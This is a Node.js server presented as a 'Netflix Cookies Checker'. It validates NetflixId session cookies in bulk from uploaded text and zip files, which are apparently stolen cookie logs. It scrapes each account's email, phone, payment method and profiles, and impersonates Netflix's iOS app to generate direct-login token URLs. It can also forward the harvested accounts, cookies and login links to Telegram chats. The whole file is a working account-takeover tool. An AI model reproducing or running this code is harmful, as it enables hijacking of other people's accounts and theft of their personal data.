const express = require('express');
const cors = require('cors');
const multer = require('multer');
const AdmZip = require('adm-zip');
const axios = require('axios');
const https = require('https');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// In-memory upload storage for multer
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 100 * 1024 * 1024 } // 100MB
});

const OWNER_CREDIT = "Huy Vũ - https://huyvu2512.io.vn";

const TELEGRAM_CONFIG = {
    enabled: false,
    bot_token: '',
    chat_id: '',
    chat_ids: []
};

// Disable TLS verification for legacy/mocked endpoints
const insecureAgent = new https.Agent({ rejectUnauthorized: false });

function unescapePlan(s) {
    if (!s) return s;
    try {
        return s.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
                .replace(/\\x([0-9a-fA-F]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
    } catch {
        return s;
    }
}

function formatBillingDate(raw) {
    if (!raw || raw === 'Unknown') return raw || 'Unknown';
    try {
        let clean = raw.replace(/\\x2B|%2B|\\x2b/g, '+');
        clean = clean.split('.')[0].replace(/[+-]\d{2}:?\d{2}$/, '');
        const dt = new Date(clean);
        if (!isNaN(dt.getTime())) {
            const d = String(dt.getDate()).padStart(2, '0');
            const m = String(dt.getMonth() + 1).padStart(2, '0');
            const y = dt.getFullYear();
            return `${d}/${m}/${y}`;
        }
        const datePart = clean.split('T')[0];
        const [y, m, d] = datePart.split('-');
        if (d && m && y) return `${d}/${m}/${y}`;
        return raw;
    } catch {
        return raw;
    }
}

function extractNetflixId(content) {
    if (!content) return null;
    try {
        const data = JSON.parse(content);
        if (Array.isArray(data)) {
            for (const cookie of data) {
                if (cookie && cookie.name === 'NetflixId') {
                    return cookie.value;
                }
            }
        } else if (typeof data === 'object' && data !== null) {
            if (data.NetflixId) return data.NetflixId;
            if (Array.isArray(data.cookies)) {
                for (const cookie of data.cookies) {
                    if (cookie && cookie.name === 'NetflixId') {
                        return cookie.value;
                    }
                }
            }
        }
    } catch {}

    let match = content.match(/(?<!\w)NetflixId=([^;,\s]+)/);
    if (match) {
        let netflixId = match[1];
        if (netflixId.includes('%')) {
            try { netflixId = decodeURIComponent(netflixId); } catch {}
        }
        return netflixId;
    }

    match = content.match(/\.netflix\.com\s+TRUE\s+\/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)/);
    if (match) {
        let netflixId = match[1];
        if (netflixId.includes('%')) {
            try { netflixId = decodeURIComponent(netflixId); } catch {}
        }
        return netflixId;
    }

    match = content.match(/NetflixId[=:\s]+([^\s;,\n]+)/i);
    if (match) {
        let netflixId = match[1];
        if (netflixId.includes('%')) {
            try { netflixId = decodeURIComponent(netflixId); } catch {}
        }
        return netflixId;
    }

    return null;
}

function extractNextBillingDate(responseText) {
    try {
        const billingMatch = responseText.match(/"nextBillingDate":\s*\{[^}]+\}/);
        if (billingMatch) {
            const dateMatch = billingMatch[0].match(/"date":\s*"([^"]+)"/);
            if (dateMatch) return dateMatch[1];
        }
        const altMatch = responseText.match(/"nextBillingDate"[^}]+"date":\s*"([^"]+)"/);
        if (altMatch) return altMatch[1];
    } catch (e) {
        console.error('Error extracting billing date:', e);
    }
    return 'Unknown';
}

async function checkNetflixCookie(cookieDict) {
    const netflixId = cookieDict.NetflixId;
    const url = 'https://www.netflix.com/YourAccount';
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': `NetflixId=${netflixId}`
    };

    try {
        const resp = await axios.get(url, {
            headers,
            timeout: 30000,
            maxRedirects: 5,
            validateStatus: () => true
        });

        const txt = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);

        if (txt.toLowerCase().includes('"mode":"login"')) {
            return { ok: false, err: 'Invalid cookie (login page detected)', cookie: cookieDict };
        }

        if (!txt.includes('"mode":"yourAccount"')) {
            return { ok: false, err: 'Invalid cookie (not logged in)', cookie: cookieDict };
        }

        const find = (pattern) => {
            const m = txt.match(pattern);
            return m ? m[1].trim() : null;
        };

        let plan = find(/"planName"\s*:\s*"([^"]+)"/) || find(/localizedPlanName[^}]+"value":"([^"]+)"/);
        plan = plan ? unescapePlan(plan) : 'Unknown';

        let plan_price = find(/"planPrice"[^}]+"value":"([^"]+)"/) || find(/planPrice[^}]+value[^}]+"([^"]+)"/);
        plan_price = plan_price ? unescapePlan(plan_price) : 'Unknown';

        let member_since = find(/"memberSince":"([^"]+)"/);
        member_since = member_since ? unescapePlan(member_since) : 'Unknown';

        let payment_method = find(/"paymentMethod"[^}]+"value":"([^"]+)"/) || 'Unknown';

        let phone = find(/"phoneNumberDigits"[^}]+"value":"([^"]+)"/);
        phone = phone ? phone.replace(/\\x2B|%2B/g, '+') : 'Unknown';

        const phoneVerifiedMatch = txt.match(/"growthPhoneNumber"[^}]+"isVerified":(true|false)/);
        const phone_verified = phoneVerifiedMatch && phoneVerifiedMatch[1] === 'true' ? 'Yes' : 'No';

        const video_quality = find(/"videoQuality"[^}]+"value":"([^"]+)"/) || 'Unknown';
        const max_streams = find(/"maxStreams"[^}]+"value":(\d+)/) || 'Unknown';

        const paymentHoldMatch = txt.match(/"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)/);
        const on_payment_hold = paymentHoldMatch && paymentHoldMatch[1] === 'true' ? 'Yes' : 'No';

        const extraMemberMatch = txt.match(/"showExtraMemberSection"[^}]+"value":(true|false)/);
        const extra_member = extraMemberMatch && extraMemberMatch[1] === 'true' ? 'Yes' : 'No';

        const email_verified = /"emailVerified"\s*:\s*true/.test(txt) ? 'Yes' : 'No';

        const country = find(/"countryOfSignup"\s*:\s*"([^"]+)"/) || find(/"countryCode"\s*:\s*"([^"]+)"/) || 'Unknown';

        let email = find(/"emailAddress"\s*:\s*"([^"]+)"/) || 'Unknown';
        if (email && email !== 'Unknown') {
            try { email = decodeURIComponent(email); } catch {}
        }

        const next_billing = extractNextBillingDate(txt);

        const profiles = [];
        try {
            const matches = txt.matchAll(/"profileName"\s*:\s*"([^"]+)"/g);
            for (const match of matches) {
                if (match[1] && !profiles.includes(match[1])) {
                    profiles.push(match[1]);
                }
            }
        } catch {}
        const profiles_str = profiles.length ? profiles.join(', ') : 'Unknown';

        const statusMatch = txt.match(/"membershipStatus":\s*"([^"]+)"/);
        let is_premium = Boolean(statusMatch && statusMatch[1] === 'CURRENT_MEMBER');
        let is_valid = Boolean(statusMatch);

        if (!is_valid && cookieDict.NetflixId) {
            is_valid = ['Account & Billing', 'membershipStatus', 'planName'].some(phrase => txt.includes(phrase));
            is_premium = is_valid;
        }

        return {
            ok: is_valid,
            premium: is_premium,
            country,
            plan,
            plan_price,
            member_since,
            payment_method,
            phone,
            phone_verified,
            video_quality,
            max_streams,
            on_payment_hold,
            extra_member,
            email_verified,
            email,
            profiles: profiles_str,
            next_billing: formatBillingDate(next_billing),
            cookie: cookieDict
        };
    } catch (e) {
        console.error('Error checking Netflix cookie:', e.message);
        return { ok: false, err: e.message, cookie: cookieDict };
    }
}

async function generateToken(netflixId) {
    const url = 'https://ios.prod.ftl.netflix.com/iosui/user/15.48';
    const params = {
        appVersion: "15.48.1",
        config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        device_type: "NFAPPL-02-",
        esn: "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        idiom: "phone",
        iosVersion: "15.8.5",
        isTablet: "false",
        languages: "en-US",
        locale: "en-US",
        maxDeviceWidth: "375",
        model: "saget",
        modelType: "IPHONE8-1",
        odpAware: "true",
        path: '["account","token","default"]',
        pathFormat: "graph",
        pixelDensity: "2.0",
        progressive: "false",
        responseFormat: "json"
    };

    const headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.context.top-level-uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.client.iosversion': "15.8.5",
        'accept-language': "en-US;q=1",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': `NetflixId=${netflixId}`
    };

    try {
        const resp = await axios.get(url, {
            params,
            headers,
            timeout: 30000,
            httpsAgent: insecureAgent
        });

        const data = resp.data;
        if (data && data.value && data.value.account && data.value.account.token && data.value.account.token.default) {
            const tokenData = data.value.account.token.default;
            const token = tokenData.token;
            let expires = tokenData.expires;
            if (String(expires).length === 13) {
                expires = Math.floor(expires / 1000);
            }
            const generationTime = Math.floor(Date.now() / 1000);
            const timeRemaining = expires - generationTime;

            return {
                status: "Success",
                generation_time: generationTime,
                expires: expires,
                time_remaining: timeRemaining,
                token: token,
                direct_login_url: `https://netflix.com/unsupported?nftoken=${token}`
            };
        } else {
            return { status: "Failure", error: "No token found in response" };
        }
    } catch (e) {
        return { status: "Error", error: e.message };
    }
}

async function sendToTelegram(accountData, filename, originalContent = "") {
    let chatIds = TELEGRAM_CONFIG.chat_ids || [];
    if (chatIds.length === 0 && TELEGRAM_CONFIG.chat_id) {
        chatIds = [TELEGRAM_CONFIG.chat_id];
    }
    if (!TELEGRAM_CONFIG.enabled || !TELEGRAM_CONFIG.bot_token || chatIds.length === 0) {
        return false;
    }

    try {
        const botToken = TELEGRAM_CONFIG.bot_token;
        const now = new Date();
        const dateStr = now.toISOString().replace('T', ' ').slice(0, 19);

        let message = "🎬 *TÀI KHOẢN NETFLIX HỢP LỆ* 🎬\n\n";
        message += "📋 *THÔNG TIN CƠ BẢN*\n";
        message += `▫️ *File:* \`${filename.replace(/_/g, '\\_')}\`\n`;
        message += `▫️ *Thời gian:* \`${dateStr}\`\n`;
        message += `▫️ *Trạng thái:* \`${accountData.ok ? '✅ HỢP LỆ' : '❌ KHÔNG HỢP LỆ'}\`\n`;
        message += `▫️ *Premium:* \`${accountData.premium ? '👑 CÓ' : '❌ KHÔNG'}\`\n\n`;

        message += "🌍 *CHI TIẾT TÀI KHOẢN*\n```\n";
        message += `Quốc gia:        ${accountData.country}\n`;
        message += `Gói:             ${accountData.plan}\n`;
        message += `Giá:             ${accountData.plan_price}\n`;
        message += `Thành viên từ:   ${accountData.member_since}\n`;
        message += `Phương thức TT:  ${accountData.payment_method}\n`;
        message += `Ngày gia hạn:    ${accountData.next_billing}\n`;
        message += "```\n\n";

        message += "👤 *THÔNG TIN HỒ SƠ*\n```\n";
        message += `Email:           ${(accountData.email || '').replace(/\\x40/g, '@')}\n`;
        message += `Xác minh Email:  ${accountData.email_verified === 'Yes' ? 'Có' : 'Không'}\n`;
        message += `Điện thoại:      ${accountData.phone}\n`;
        message += `Xác minh ĐT:     ${accountData.phone_verified === 'Yes' ? 'Có' : 'Không'}\n`;
        message += `Hồ sơ:           ${accountData.profiles}\n`;
        message += "```\n\n";

        message += "⚙️ *TÍNH NĂNG TÀI KHOẢN*\n```\n";
        message += `Chất lượng:      ${accountData.video_quality}\n`;
        message += `Số màn hình:     ${accountData.max_streams}\n`;
        message += `Tạm giữ TT:      ${accountData.on_payment_hold === 'Yes' ? 'Có' : 'Không'}\n`;
        message += `Thành viên phụ:  ${accountData.extra_member === 'Yes' ? 'Có' : 'Không'}\n`;
        message += "```\n";

        const nftdata = accountData.cookie || {};
        message += "🍪 *COOKIES*\n```\n";
        message += `NetflixId=${nftdata.NetflixId || ''}\n`;
        message += "```\n";

        if (accountData.token_result && accountData.token_result.status === 'Success') {
            const token = accountData.token_result;
            const genTime = new Date(token.generation_time * 1000).toISOString().replace('T', ' ').slice(0, 19);
            const expTime = new Date(token.expires * 1000).toISOString().replace('T', ' ').slice(0, 19);

            const days = Math.floor(token.time_remaining / 86400);
            const hours = Math.floor((token.time_remaining % 86400) / 3600);
            const minutes = Math.floor((token.time_remaining % 3600) / 60);
            const seconds = token.time_remaining % 60;

            message += "\n🔑 *THÔNG TIN TOKEN*\n```\n";
            message += `Trạng thái:      ${token.status}\n`;
            message += `Tạo lúc:         ${genTime}\n`;
            message += `Hết hạn:         ${expTime}\n`;
            message += `Còn lại:         ${days}d ${hours}h ${minutes}m ${seconds}s\n`;
            message += "```\n\n";

            const mobileUrl = `https://netflix.com/unsupported?nftoken=${token.token}`;
            const desktopUrl = `https://www.netflix.com/account?nftoken=${encodeURIComponent(token.token)}`;

            message += "📱 *ĐĂNG NHẬP ĐIỆN THOẠI*\n";
            message += `\`${mobileUrl}\`\n\n`;

            message += "🖥️ *ĐĂNG NHẬP MÁY TÍNH*\n";
            message += `\`${desktopUrl}\`\n\n`;
        }

        message += "\n" + "━".repeat(26) + "\n";
        message += "🤖 Được tạo bởi Netflix Cookies Checker\n";
        message += "👤 Chủ sở hữu: @huyvu2512";

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        let successCount = 0;

        for (const cid of chatIds) {
            try {
                const resp = await axios.post(url, {
                    chat_id: cid,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                }, { timeout: 10000, httpsAgent: insecureAgent });

                if (resp.status === 200) {
                    successCount++;
                }
            } catch (err) {
                console.error(`Failed to send to ${cid}:`, err.message);
            }
        }

        return successCount > 0;
    } catch (e) {
        console.error('Error sending to Telegram:', e.message);
        return false;
    }
}

// ── API Routes ──

app.post(['/api/telegram-config', '/telegram-config'], (req, res) => {
    try {
        const data = req.body || {};
        TELEGRAM_CONFIG.enabled = !!data.enabled;
        TELEGRAM_CONFIG.bot_token = data.bot_token || '';

        let chatIds = data.chat_ids || [];
        if ((!chatIds || chatIds.length === 0) && data.chat_id) {
            chatIds = [data.chat_id];
        }
        TELEGRAM_CONFIG.chat_ids = chatIds;
        TELEGRAM_CONFIG.chat_id = chatIds[0] || '';

        res.json({
            status: 'success',
            message: 'Telegram configuration updated',
            config: TELEGRAM_CONFIG
        });
    } catch (e) {
        res.json({
            status: 'error',
            message: `Error updating Telegram config: ${e.message}`
        });
    }
});

app.post(['/api/check', '/check'], async (req, res) => {
    try {
        const { content = '', mode = 'fullinfo', send_telegram = false } = req.body || {};

        if (!content) {
            return res.json({ status: 'error', message: 'No content provided' });
        }

        const netflixId = extractNetflixId(content);
        if (!netflixId) {
            return res.json({ status: 'error', message: 'No NetflixId found in the provided content' });
        }

        const accountInfo = await checkNetflixCookie({ NetflixId: netflixId });

        if (mode === 'tokenonly' || accountInfo.ok) {
            const tokenResult = await generateToken(netflixId);

            const result = {
                status: 'success',
                netflix_id: netflixId,
                account_info: accountInfo,
                token_result: tokenResult,
                mode,
                owner: OWNER_CREDIT
            };

            if (send_telegram && TELEGRAM_CONFIG.enabled && tokenResult.status === 'Success') {
                const telegramSent = await sendToTelegram({
                    ...accountInfo,
                    token_result: tokenResult
                }, "manual_input.txt", content);
                result.telegram_sent = telegramSent;
            }

            return res.json(result);
        } else {
            return res.json({
                status: 'error',
                message: `Invalid account: ${accountInfo.err || 'Unknown error'}`,
                owner: OWNER_CREDIT
            });
        }
    } catch (e) {
        return res.json({
            status: 'error',
            message: `Error processing content: ${e.message}`,
            owner: OWNER_CREDIT
        });
    }
});

app.post(['/api/batch-check', '/batch-check'], upload.array('files'), async (req, res) => {
    try {
        const files = req.files || [];
        const mode = req.body.mode || 'fullinfo';

        if (files.length === 0) {
            return res.json({ status: 'error', message: 'No files provided', owner: OWNER_CREDIT });
        }

        const results = [];

        for (const file of files) {
            const filename = file.originalname || 'file.txt';

            try {
                if (filename.toLowerCase().endsWith('.zip')) {
                    const zip = new AdmZip(file.buffer);
                    const zipEntries = zip.getEntries();

                    for (const entry of zipEntries) {
                        if (entry.isDirectory || !entry.entryName.toLowerCase().endsWith('.txt')) {
                            continue;
                        }

                        const textContent = entry.getData().toString('utf-8');
                        const subFilename = path.basename(entry.entryName);
                        const netflixId = extractNetflixId(textContent);

                        if (netflixId) {
                            const accountInfo = await checkNetflixCookie({ NetflixId: netflixId });
                            if (accountInfo.ok) {
                                const tokenResult = await generateToken(netflixId);
                                results.push({
                                    status: 'success',
                                    filename: subFilename,
                                    netflix_id: netflixId,
                                    account_info: accountInfo,
                                    token_result: tokenResult,
                                    mode
                                });
                            } else {
                                results.push({
                                    status: 'error',
                                    filename: subFilename,
                                    message: `Invalid account: ${accountInfo.err || 'Unknown error'}`
                                });
                            }
                        } else {
                            results.push({
                                status: 'error',
                                filename: subFilename,
                                message: 'No NetflixId found'
                            });
                        }
                    }
                } else if (filename.toLowerCase().endsWith('.txt')) {
                    const textContent = file.buffer.toString('utf-8');
                    const netflixId = extractNetflixId(textContent);

                    if (netflixId) {
                        const accountInfo = await checkNetflixCookie({ NetflixId: netflixId });
                        if (accountInfo.ok) {
                            const tokenResult = await generateToken(netflixId);
                            results.push({
                                status: 'success',
                                filename,
                                netflix_id: netflixId,
                                account_info: accountInfo,
                                token_result: tokenResult,
                                mode
                            });
                        } else {
                            results.push({
                                status: 'error',
                                filename,
                                message: `Invalid account: ${accountInfo.err || 'Unknown error'}`
                            });
                        }
                    } else {
                        results.push({
                            status: 'error',
                            filename,
                            message: 'No NetflixId found'
                        });
                    }
                } else {
                    results.push({
                        status: 'error',
                        filename,
                        message: 'Unsupported file format. Only .txt and .zip files are supported.'
                    });
                }
            } catch (err) {
                results.push({
                    status: 'error',
                    filename,
                    message: `Error processing file: ${err.message}`
                });
            }
        }

        return res.json({
            status: 'success',
            results,
            owner: OWNER_CREDIT
        });
    } catch (e) {
        return res.json({
            status: 'error',
            message: `Error processing batch: ${e.message}`,
            owner: OWNER_CREDIT
        });
    }
});

// Serve static frontend files
app.use(express.static(path.join(__dirname, 'public')));

app.get('/favicon.ico', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'favicon.ico'));
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running at http://localhost:${PORT}`);
});

server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        const fallbackPort = Number(PORT) + 1;
        console.warn(`[Cảnh báo] Port ${PORT} đang bận, tự động chuyển sang port ${fallbackPort}...`);
        app.listen(fallbackPort, '0.0.0.0', () => {
            console.log(`Server running at http://localhost:${fallbackPort}`);
        });
    } else {
        console.error('Server error:', err);
    }
});
